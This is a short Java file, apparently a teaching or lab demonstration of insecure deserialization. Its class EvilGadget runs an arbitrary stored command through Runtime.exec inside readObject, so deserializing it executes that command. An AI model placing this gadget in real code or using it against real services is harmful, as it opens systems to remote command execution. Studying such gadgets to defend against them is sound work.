package com.example;

import java.io.ObjectInputStream;
import java.io.Serializable;

public class EvilGadget implements Serializable {
    // one field
    private String command;
    // basic constructor
    public EvilGadget(String command) {
        this.command = command;
    }

    // method which will be ran during deserialization
    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject();
        Runtime.getRuntime().exec(command);
    }
}